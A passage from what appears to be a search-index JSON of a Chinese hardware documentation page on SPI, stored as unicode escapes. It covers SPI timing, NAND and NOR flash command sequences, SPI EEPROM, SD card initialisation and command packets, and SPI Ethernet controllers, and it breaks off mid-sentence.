<p>\u200b\u6ce2\u5f62\u56fe\u200b\u4e2d\u200b\uff0c\u200b\u65f6\u949f\u200b\uff08<code>sclk</code>\uff09\u200b\u4e0a\u5347\u200b\u6cbf\u65f6\u200b\uff0c\u200b\u6570\u636e\u200b\u5904\u4e8e\u200b\u7a33\u5b9a\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6b64\u65f6\u200b Master \u200b\u5bf9\u200b MISO \u200b\u91c7\u6837\u200b\uff0cSlave \u200b\u5bf9\u200b MOSI \u200b\u91c7\u6837\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u7a33\u5b9a\u200b\u7684\u200b\u6570\u636e\u200b\uff1b\u200b\u65f6\u949f\u200b\u4e0b\u964d\u200b\u6cbf\u65f6\u200b\uff0cMaster \u200b\u548c\u200b Slave \u200b\u4fee\u6539\u200b\u8f93\u51fa\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5b9e\u9645\u200b\u5728\u200b RTL \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cMaster \u200b\u53ef\u4ee5\u200b\u4e0d\u5199\u200b negedge \u200b\u903b\u8f91\u200b\uff0c\u200b\u800c\u662f\u200b\u5199\u200b\u4e00\u4e2a\u200b\u5206\u9891\u5668\u200b\uff0c\u200b\u5728\u200b\u5206\u9891\u200b\u51fa\u6765\u200b\u7684\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b\u91cc\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u6570\u636e\u200b\u7684\u200b\u4fee\u6539\u200b\uff0c\u200b\u5982\u4e0a\u56fe\u200b\u4e2d\u200b\u7684\u200b <code>clk</code> \u200b\u5206\u9891\u200b\u5230\u200b <code>sclk</code>\u3002\u200b\u4e00\u822c\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b\u72b6\u6001\u673a\u200b\u6765\u200b\u5b9e\u73b0\u200b SPI Master\uff0c\u200b\u8bb0\u5f55\u200b\u5f53\u524d\u200b\u4f20\u8f93\u200b\u5230\u200b\u54ea\u200b\u4e00\u4e2a\u200b bit\uff0c\u200b\u4ee5\u53ca\u200b\u8bb0\u5f55\u200b\u5f53\u524d\u200b\u662f\u200b <code>sclk</code> \u200b\u7684\u200b\u6b63\u534a\u200b\u5468\u671f\u200b\u8fd8\u662f\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b\u3002</p> <p>SPI \u200b\u672c\u8eab\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6838\u5fc3\u200b\u4e0d\u200b\u5728\u200b SPI\uff0c\u200b\u800c\u662f\u200b\u5728\u200b SPI \u200b\u4e4b\u4e0a\u200b\u5b9a\u4e49\u200b\u7684\u200b\u5404\u79cd\u200b\u534f\u8bae\u200b\u3002</p>"},{"location":"hardware/spi.html#spi-flash","title":"SPI Flash","text":"<p>SPI Flash \u200b\u662f\u200b\u4e00\u79cd\u200b\u5f88\u200b\u5e38\u89c1\u200b\u7684\u200b SPI \u200b\u5916\u8bbe\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u8bbf\u95ee\u200b NAND/NOR Flash\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0c\u200b\u5f88\u591a\u200b SPI Flash \u200b\u8fd8\u4f1a\u200b\u63d0\u4f9b\u200b Dual SPI \u200b\u548c\u200b Quad SPI \u200b\u6a21\u5f0f\u200b\u3002\u200b\u6807\u51c6\u200b\u7684\u200b SPI \u200b\u4e2d\u200b\uff0cMaster \u200b\u5230\u200b Slave \u200b\u548c\u200b Slave \u200b\u5230\u200b Master \u200b\u5206\u522b\u200b\u662f\u200b\u4e00\u6839\u200b\u4fe1\u53f7\u7ebf\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u7ee7\u7eed\u200b\u63d0\u9ad8\u200b\u6027\u80fd\u200b\uff0c\u200b\u90a3\u200b\u5c31\u8981\u200b\u5f15\u5165\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u4fe1\u53f7\u7ebf\u200b\u6765\u200b\u8fdb\u884c\u200b\u6570\u636e\u4f20\u8f93\u200b\uff0c\u200b\u6240\u4ee5\u200b Dual SPI \u200b\u5c31\u662f\u200b\u8ba9\u200b\u539f\u6765\u200b\u7684\u200b MISO \u200b\u548c\u200b MOSI \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u53d1\u9001\u6570\u636e\u200b\uff1bQuad SPI \u200b\u5219\u200b\u662f\u200b\u53c8\u200b\u989d\u5916\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u4fe1\u53f7\u7ebf\u200b\u6765\u200b\u8fdb\u884c\u200b\u6570\u636e\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b SPI Flash \u200b\u5382\u5bb6\u200b\uff1a</p> <ul> <li>Spansion -&gt; Cypress -&gt; Infineon</li> <li>Numonyx -&gt; Micron</li> <li>Winbond</li> <li>GigaDevice</li> <li>Macronix</li> </ul>"},{"location":"hardware/spi.html#spi-nand-flash","title":"SPI NAND Flash","text":"<p>\u200b\u4e0b\u9762\u200b\u4ee5\u200b Alliance Memory SPI NAND Flash Datasheet \u200b\u4e3a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u770b\u770b\u200b\u901a\u5e38\u200b SPI Flash \u200b\u90fd\u200b\u652f\u6301\u200b\u54ea\u4e9b\u200b\u547d\u4ee4\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b\u5982\u4f55\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u3002</p> <p>\u200b\u8fd9\u200b\u6b3e\u200b SPI NAND Flash \u200b\u7684\u200b\u5185\u90e8\u200b\u5b58\u50a8\u200b\u5206\u4e3a\u200b\u4e09\u5c42\u200b\uff1a</p> <ol> <li>Block\uff1a\u200b\u6570\u91cf\u200b\u4e0d\u5b9a\u200b</li> <li>Page\uff1a\u200b\u6bcf\u4e2a\u200b Block \u200b\u5305\u62ec\u200b 64 \u200b\u4e2a\u200b Page</li> <li>Byte\uff1a\u200b\u6bcf\u4e2a\u200b Page \u200b\u5305\u62ec\u200b\u4e00\u5b9a\u200b\u6570\u91cf\u200b\u7684\u200b Byte\uff0c\u200b\u5e38\u89c1\u200b\u7684\u200b\u6709\u200b 2112(2048+64)\u30012176(2048+128)\u30014352(4096+256)</li> </ol> <p>NAND Flash \u200b\u7684\u200b\u8bfb\u53d6\u200b\u7c92\u5ea6\u200b\u662f\u200b Page\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b NAND Flash \u200b\u66f4\u200b\u50cf\u200b\u5757\u200b\u8bbe\u5907\u200b\u3002\u200b\u4e00\u6b21\u200b\u8bfb\u53d6\u200b\u8fc7\u7a0b\u200b\u5206\u4e3a\u200b\u4e09\u4e2a\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>\u200b\u53d1\u9001\u200b 13H(Page Read to Cache) \u200b\u547d\u4ee4\u200b\uff0c\u200b\u628a\u200b\u4e00\u4e2a\u200b Page \u200b\u7684\u200b\u6570\u636e\u200b\u8bfb\u53d6\u200b\u5230\u200b NAND Flash \u200b\u5185\u90e8\u200b\u7684\u200b Cache \u200b\u4e2d\u200b</li> <li>\u200b\u4e0d\u65ad\u200b\u53d1\u9001\u200b 0FH(Get Feature) \u200b\u547d\u4ee4\u200b\uff0c\u200b\u76f4\u5230\u200b NAND Flash \u200b\u8868\u793a\u200b Page Read to Cache \u200b\u547d\u4ee4\u200b\u5b8c\u6210\u200b</li> <li>\u200b\u53d1\u9001\u200b Read from Cache \u200b\u547d\u4ee4\u200b\uff0c\u200b\u8003\u8651\u200b\u5230\u200b\u4f20\u8f93\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4e0d\u540c\u200b\uff0c\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u51e0\u79cd\u200b\uff1a<ol> <li>Read from Cache x1 IO(03H/0BH): Master \u200b\u7ed9\u51fa\u200b 1 \u200b\u5b57\u8282\u200b\u547d\u4ee4\u200b\uff0c2 \u200b\u5b57\u8282\u200b\u5730\u5740\u200b\u548c\u200b 1 \u200b\u5b57\u8282\u200b dummy \u200b\u6570\u636e\u200b\uff0c\u200b\u5171\u200b 8(COMMAND)+16(ADDR)+8(DUMMY) \u200b\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u4e4b\u540e\u200b Slave \u200b\u4ece\u200b MISO \u200b\u7ed9\u51fa\u200b\u6570\u636e\u200b</li> <li>Read from Cache x2 IO(3BH): Slave \u200b\u540c\u65f6\u200b\u901a\u8fc7\u200b MISO \u200b\u548c\u200b MOSI \u200b\u7ed9\u51fa\u200b\u6570\u636e\u200b</li> <li>Read from Cache x4 IO(6BH): Slave \u200b\u540c\u65f6\u200b\u901a\u8fc7\u200b MISO\u3001MOSI\u3001WP# \u200b\u548c\u200b HOLD# \u200b\u7ed9\u51fa\u200b\u6570\u636e\u200b</li> <li>Read from Cache Dual IO(BBH): \u200b\u5728\u200b 3BH \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0cMaster \u200b\u4e5f\u200b\u540c\u65f6\u200b\u901a\u8fc7\u200b MISO \u200b\u548c\u200b MOSI \u200b\u7ed9\u51fa\u200b\u5730\u5740\u200b\u548c\u200b dummy \u200b\u5b57\u8282\u200b\uff0c\u200b\u6240\u4ee5\u200b Master \u200b\u53ea\u200b\u5360\u7528\u200b 8(COMMAND)+8(ADDR)+4(DUMMY) \u200b\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u95f4\u200b\u53d1\u9001\u200b</li> <li>Read from Cache Quad IO(EBH): \u200b\u5728\u200b 6BH \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0cMaster \u200b\u4e5f\u200b\u540c\u65f6\u200b\u901a\u8fc7\u200b\u56db\u4e2a\u200b\u6570\u636e\u4fe1\u53f7\u200b\u7ed9\u51fa\u200b\u5730\u5740\u200b\u548c\u200b dummy \u200b\u5b57\u8282\u200b\uff0c\u200b\u6240\u4ee5\u200b Master \u200b\u53ea\u200b\u5360\u7528\u200b 8(COMMAND)+4(ADDR)+2(DUMMY) \u200b\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u95f4\u200b\u53d1\u9001\u200b</li> </ol> </li> </ol> <p>\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b NAND Flash \u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u9996\u5148\u200b\u9700\u8981\u200b\u64e6\u9664\u200b\uff0c\u200b\u628a\u200b\u4e00\u4e2a\u200b Block \u200b\u7684\u200b\u5185\u5bb9\u200b\u5168\u90e8\u200b\u64e6\u9664\u200b\uff0c\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u6bcf\u4e2a\u200b Block \u200b\u5305\u62ec\u200b\u591a\u4e2a\u200b Page\uff0c\u200b\u6240\u4ee5\u200b\u64e6\u9664\u200b\u7684\u200b\u7c92\u5ea6\u200b\u662f\u200b\u5f88\u7c97\u200b\u7684\u200b\u3002\u200b\u64e6\u9664\u200b\u8fc7\u200b\u7684\u200b Page \u200b\u624d\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u5199\u5165\u200b\uff0c\u200b\u5177\u4f53\u6b65\u9aa4\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u53d1\u9001\u200b 06H(Write Enable) \u200b\u5141\u8bb8\u200b\u5199\u5165\u200b</li> <li>\u200b\u53d1\u9001\u200b 02H(Program Load) \u200b\u6216\u200b 32H(Program Load x4) \u200b\u628a\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u7ed9\u200b NAND Flash \u200b\u4e2d\u200b\u7684\u200b Cache\uff1b02H \u200b\u548c\u200b 32H \u200b\u7684\u200b\u533a\u522b\u200b\u5c31\u662f\u200b\u540e\u8005\u200b\u540c\u65f6\u200b\u5728\u200b\u56db\u4e2a\u200b\u4fe1\u53f7\u7ebf\u200b\u4e0a\u200b\u4f20\u8f93\u6570\u636e\u200b</li> <li>\u200b\u53d1\u9001\u200b 10H(Program Execute) \u200b\u8fdb\u884c\u200b\u5b9e\u9645\u200b\u7684\u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4ece\u200b Cache \u200b\u5230\u200b Flash \u200b\u5b58\u50a8\u200b</li> <li>\u200b\u4e0d\u65ad\u200b\u53d1\u9001\u200b 0FH(Get Feature) \u200b\u547d\u4ee4\u200b\uff0c\u200b\u76f4\u5230\u200b Program Execute \u200b\u64cd\u4f5c\u200b\u5b8c\u6210\u200b</li> </ol>"},{"location":"hardware/spi.html#spi-nor-flash","title":"SPI NOR Flash","text":"<p>NOR Flash \u200b\u548c\u200b NAND Flash \u200b\u7684\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff0cNOR Flash \u200b\u53ef\u4ee5\u200b\u968f\u673a\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b XIP \u200b\u652f\u6301\u200b\u3002\u200b\u4e0b\u9762\u200b\u4ee5\u200b 128Mb, 3V, Multiple I/O Serial Flash Memory \u200b\u4e3a\u200b\u4f8b\u5b50\u200b\u770b\u770b\u200b\u5b83\u200b\u662f\u200b\u5982\u4f55\u200b\u8bfb\u5199\u200b\u7684\u200b\u3002</p> <p>SPI NOR Flash \u200b\u8bfb\u53d6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u4e00\u6761\u200b\u547d\u4ee4\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\uff1aREAD/FAST READ\u3002\u200b\u5176\u4e2d\u200b READ \u200b\u547d\u4ee4\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff1a\u200b\u53d1\u9001\u200b Command\uff0c\u200b\u53d1\u9001\u200b\u5730\u5740\u200b\uff0c\u200b\u7136\u540e\u200b Slave \u200b\u7d27\u63a5\u7740\u200b\u5c31\u200b\u4f1a\u200b\u53d1\u9001\u6570\u636e\u200b\uff1bFAST READ \u200b\u53ef\u4ee5\u200b\u8fbe\u5230\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u9891\u7387\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e3a\u4e86\u200b\u8ba9\u200b NOR Flash \u200b\u6709\u200b\u65f6\u95f4\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u5728\u200b Master \u200b\u53d1\u9001\u200b Command \u200b\u548c\u200b\u5730\u5740\u200b\u540e\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u53d1\u9001\u200b Dummy cycles\uff0c\u200b\u7136\u540e\u200b Slave \u200b\u624d\u200b\u4f1a\u200b\u53d1\u9001\u6570\u636e\u200b\u3002\u200b\u548c\u200b\u524d\u9762\u200b\u4e00\u6837\u200b\uff0cFAST READ \u200b\u4e5f\u200b\u652f\u6301\u200b\u4e0d\u540c\u200b\u7684\u200b IO \u200b\u7c7b\u578b\u200b\uff0c\u200b\u4f8b\u5982\u200b Dual Output\uff0cDual Input/Output\uff0cQuad Output\uff0cQuad Input/Output\u3002\u200b\u4e00\u4e9b\u200b\u6bd4\u8f83\u200b\u9ad8\u7aef\u200b\u7684\u200b SPI NOR Flash \u200b\u8fd8\u200b\u652f\u6301\u200b DTR\uff08Double Transfer Rate\uff09\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b DDR\uff0c\u200b\u5728\u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u548c\u200b\u4e0b\u964d\u200b\u6cbf\u90fd\u200b\u91c7\u6837\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u548c\u200b NAND Flash \u200b\u4e00\u6837\u200b\uff0c\u200b\u4e5f\u200b\u9700\u8981\u200b\u5148\u200b\u64e6\u9664\u200b\uff0c\u200b\u518d\u200b\u5199\u5165\u200b\u3002SPI Flash \u200b\u7684\u200b\u5b58\u50a8\u200b\u5c42\u7ea7\u200b\u662f\u200b\uff1a</p> <ol> <li>Sector</li> <li>Subsector</li> <li>Page</li> <li>Byte</li> </ol> <p>\u200b\u64e6\u9664\u200b\u7684\u200b\u7c92\u5ea6\u200b\u662f\u200b Sector \u200b\u6216\u8005\u200b Subsector\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u7c92\u5ea6\u200b\u662f\u200b Page\u3002\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u9700\u8981\u200b\u9996\u5148\u200b\u53d1\u9001\u200b WRITE ENABLE \u200b\u547d\u4ee4\u200b\uff0c\u200b\u518d\u200b\u53d1\u9001\u200b PAGE PROGRAM \u200b\u547d\u4ee4\u200b\u3002NOR Flash \u200b\u5728\u200b Program \u200b\u4e0a\u200b\u4e5f\u200b\u6bd4\u8f83\u200b\u7b80\u5316\u200b\uff0c\u200b\u76f4\u63a5\u200b Program \u200b\u5373\u53ef\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5148\u200b\u5199\u5165\u200b\u5230\u200b Cache\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b Program\u3002</p> <p>NOR Flash \u200b\u8fd8\u200b\u63d0\u4f9b\u200b\u4e86\u200b XIP Mode \u200b\u6765\u200b\u52a0\u5feb\u200b\u968f\u673a\u200b\u8bbf\u95ee\u200b\uff1a\u200b\u542f\u7528\u200b XIP \u200b\u6a21\u5f0f\u200b\u540e\u200b\uff0c\u200b\u7ed9\u51fa\u200b\u4e00\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u7b49\u5f85\u200b Dummy cycles \u200b\u540e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8bfb\u51fa\u200b\u6570\u636e\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u50cf\u200b\u524d\u9762\u200b\u90a3\u6837\u200b\u53d1\u9001\u200b COMMAND\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4e0d\u200b\u6253\u5f00\u200b NOR Flash \u200b\u7684\u200b XIP Mode\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b SPI \u200b\u63a7\u5236\u5668\u200b\u91cc\u200b\u5b9e\u73b0\u200b XIP\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u6bcf\u6b21\u200b\u8bfb\u53d6\u200b\u90fd\u200b\u8981\u200b\u53d1\u200b\u4e00\u6b21\u200b READ \u200b\u547d\u4ee4\u200b\u3002</p>"},{"location":"hardware/spi.html#spi-eeprom","title":"SPI EEPROM","text":"<p>SPI EEPROM \u200b\u548c\u200b SPI NOR Flash \u200b\u6bd4\u8f83\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4f46\u662f\u200b EEPROM \u200b\u66f4\u200b\u5c0f\u200b\uff0c\u200b\u4e5f\u200b\u66f4\u52a0\u200b\u7b80\u5355\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u64e6\u9664\u200b\u3002\u200b\u611f\u5174\u8da3\u200b\u7684\u200b\u53ef\u4ee5\u200b\u5728\u200b SPI \u200b\u4e32\u884c\u200b EEPROM \u200b\u7cfb\u5217\u200b\u6570\u636e\u200b\u624b\u518c\u200b \u200b\u4e2d\u200b\u67e5\u770b\u200b\u547d\u4ee4\u200b\u5217\u8868\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u8d58\u8ff0\u200b\u4e86\u200b\u3002</p>"},{"location":"hardware/spi.html#sd","title":"SD \u200b\u5361","text":"<p>SD \u200b\u5361\u200b\u9664\u4e86\u200b SD Bus \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u200b\u652f\u6301\u200b SPI \u200b\u6a21\u5f0f\u200b\uff08\u200b\u6700\u65b0\u200b\u7684\u200b SDUC \u200b\u4e0d\u200b\u652f\u6301\u200b SPI \u200b\u6a21\u5f0f\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u200b SPI \u200b\u6765\u200b\u8bfb\u5199\u200b SD \u200b\u5361\u200b\u3002</p> <p>SD \u200b\u5361\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\u7684\u200b\u4e00\u70b9\u200b\u662f\u200b\uff0c\u200b\u5b83\u200b\u9700\u8981\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u521d\u59cb\u5316\u200b\u6d41\u7a0b\u200b\uff1a</p> <ol> <li>\u200b\u9996\u5148\u200b\u8981\u200b\u53d1\u9001\u200b CMD0 \u200b\u547d\u4ee4\u200b\uff0c\u200b\u540c\u65f6\u200b CS \u200b\u62c9\u4f4e\u200b\uff0c\u200b\u4f7f\u5f97\u200b SD \u200b\u5361\u200b\u8fdb\u5165\u200b SPI \u200b\u6a21\u5f0f\u200b</li> <li>\u200b\u5bf9\u4e8e\u200b SDHC SD \u200b\u5361\u200b\uff0c\u200b\u9700\u8981\u200b\u53d1\u9001\u200b CMD8 \u200b\u6765\u200b\u534f\u5546\u200b\u5de5\u4f5c\u7535\u538b\u200b\u8303\u56f4\u200b</li> <li>\u200b\u91cd\u590d\u200b\u53d1\u9001\u200b ACMD41 \u200b\u547d\u4ee4\u200b\uff08CMD55 + CMD41 = ACMD41\uff09\u200b\u8fdb\u884c\u200b\u521d\u59cb\u5316\u200b\uff0c\u200b\u76f4\u5230\u200b SD \u200b\u5361\u200b\u56de\u590d\u200b\u521d\u59cb\u5316\u200b\u5b8c\u6210\u200b</li> <li>\u200b\u53d1\u9001\u200b CMD58 \u200b\u547d\u4ee4\u200b\u4ee5\u200b\u8bfb\u53d6\u200b OCR \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b</li> </ol> <p>\u200b\u6bd4\u8f83\u200b\u6709\u610f\u601d\u200b\u7684\u200b\u662f\u200b\u547d\u4ee4\u200b\u7684\u200b\u4f20\u8f93\u65b9\u5f0f\u200b\u3002\u200b\u6bcf\u4e2a\u200b\u547d\u4ee4\u200b\u6709\u200b\u4e00\u4e2a\u200b 6 \u200b\u4f4d\u200b\u7684\u200b\u547d\u4ee4\u200b\u7f16\u53f7\u200b\uff0c\u200b\u4f8b\u5982\u200b CMD0 \u200b\u7684\u200b\u7f16\u53f7\u200b\u5c31\u662f\u200b 0\uff0cCMD55 \u200b\u7684\u200b\u7f16\u53f7\u200b\u5c31\u662f\u200b 55\uff1b\u200b\u8fd8\u200b\u5e26\u6709\u200b\u56db\u200b\u5b57\u8282\u200b\u7684\u200b\u53c2\u6570\u200b\u3002\u200b\u6bcf\u4e2a\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u7ec4\u88c5\u200b\u6210\u200b\u4e00\u4e2a\u200b 48 \u200b\u4f4d\u200b\u7684\u200b\u5206\u7ec4\u200b\uff1a</p> <ol> <li>bit[47]=0: Start Bit</li> <li>bit[46]=1: Transmission Bit</li> <li>bit[45:40]: Command Index</li> <li>bit[39:8]: Argument</li> <li>bit[7:1]: CRC7</li> <li>bit[0]=1: End Bit</li> </ol> <p>\u200b\u53ef\u89c1\u200b\u989d\u5916\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b CRC7 \u200b\u7684\u200b\u6821\u9a8c\u200b\u548c\u200b\u3002</p> <p>SD \u200b\u5361\u200b\u89c4\u5b9a\u200b\uff0cSPI \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u90fd\u200b\u662f\u200b\u5bf9\u9f50\u200b\u5230\u200b 8 \u200b\u4f4d\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u662f\u4ece\u200b CS \u200b\u62c9\u4f4e\u200b\u5f00\u59cb\u200b\u7b97\u200b\uff0c\u200b\u6bcf\u200b 8 \u200b\u4e2a\u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u662f\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u65e0\u8bba\u200b\u547d\u4ee4\u200b\u8fd8\u662f\u200b\u54cd\u5e94\u200b\uff0c\u200b\u90fd\u200b\u5728\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u8fb9\u754c\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u60f3\u8981\u200b\u8bfb\u53d6\u6570\u636e\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u8981\u200b\u53d1\u9001\u200b READ_SINGLE_BLOCK \u200b\u547d\u4ee4\u200b\uff0c\u200b\u53c2\u6570\u200b\u5c31\u662f\u200b\u8981\u200b\u8bfb\u53d6\u200b\u7684\u200b Block \u200b\u5730\u5740\u200b\uff0cBlock \u200b\u5730\u5740\u200b\u7684\u200b\u5355\u4f4d\u200b\u5728\u200b SDSC \u200b\u4e0a\u200b\u662f\u200b\u5b57\u8282\u200b\uff0c\u200b\u5728\u200b SDHC \u200b\u548c\u200b SDXC \u200b\u4e0a\u200b\u662f\u200b 512 \u200b\u5b57\u8282\u200b\u3002SD \u200b\u5361\u56de\u200b\u5148\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u54cd\u5e94\u200b\uff0c\u200b\u7136\u540e\u200b\u5f00\u59cb\u200b\u53d1\u200b\u6570\u636e\u200b\uff0c\u200b\u6570\u636e\u200b\u4ece\u200b Start Block Token \u200b\u5f00\u59cb\u200b\uff0c\u200b\u7136\u540e\u200b\u662f\u200b\u4e00\u4e2a\u200b Block \u200b\u7684\u200b\u6570\u636e\u200b\uff08\u200b\u901a\u5e38\u200b\u662f\u200b 512 \u200b\u5b57\u8282\u200b\uff09\uff0c\u200b\u6700\u540e\u200b\u518d\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b CRC16\u3002</p> <p>\u200b\u5199\u200b\u6570\u636e\u200b\u5219\u200b\u662f\u200b\u53d1\u9001\u200b WRITE_BLOCK \u200b\u547d\u4ee4\u200b\uff0cSD \u200b\u5361\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u54cd\u5e94\u200b\uff0c\u200b\u7136\u540e\u200b\u63a7\u5236\u5668\u200b\u5f00\u59cb\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u6570\u636e\u200b\u4ece\u200b Start Block Token \u200b\u5f00\u59cb\u200b\uff0c\u200b\u63a5\u7740\u200b\u662f\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6700\u540e\u200b\u662f\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b CRC16\uff0c\u200b\u7136\u540e\u200b SD \u200b\u5361\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u54cd\u5e94\u200b\uff0c\u200b\u6807\u5fd7\u200b\u7740\u200b\u5199\u5165\u200b\u6210\u529f\u200b\u3002</p>"},{"location":"hardware/spi.html#spi","title":"SPI \u200b\u4ee5\u592a\u7f51\u200b\u63a7\u5236\u5668","text":"<p>\u200b\u6709\u200b\u4e00\u4e9b\u200b\u4ee5\u592a\u7f51\u200b\u4ea7\u54c1\u200b\u63d0\u4f9b\u200b\u4e86\u200b SPI \u200b\u63a5\u53e3\u200b\uff0c\u200b\u4f8b\u5982\u200b KSZ8851SNL/SNLI\uff0c\u200b\u96c6\u6210\u200b\u4e86\u200b MAC \u200b\u548c\u200b PHY\uff0c\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b MDI/MDI-X \u200b\u63a5\u53e3\u200b\uff0c\u200b\u867d\u7136\u200b\u6700\u9ad8\u200b\u53ea\u200b\u652f\u6301\u200b\u767e\u5146\u200b\u7f51\u200b\uff0c\u200b\u4f46\u662f\u200b\u63a5\u53e3\u200b\u4e0a\u200b\u786e\u5b9e\u200b\u975e\u5e38\u7b80\u5355\u200b\u3002</p> <p>SPI \u200b\u4e0a\u200b\u53d1\u9001\u200b\u7684\u200b\u547d\u4ee4\u200b\u5c31\u200b\u4e24\u7c7b\u200b\uff1a\u200b\u4e00\u7c7b\u200b\u662f\u200b\u8bfb\u5199\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u8bfb\u5199\u200b RX/TX FIFO\u3002</p>"},{"location":"hardware/spi.html#_3","title":"\u952e\u76d8\u200b\u548c\u200b\u89e6\u6478\u677f","text":"<p>\u200b\u4e00\u4e9b\u200b\u578b\u53f7\u200b\u7684\u200b\u82f9\u679c\u7535\u8111\u200b\u7684\u200b\u952e\u76d8\u200b\u548c\u200b\u89e6\u6478\u677f\u200b\u662f\u200b\u901a\u8fc7\u200b SPI 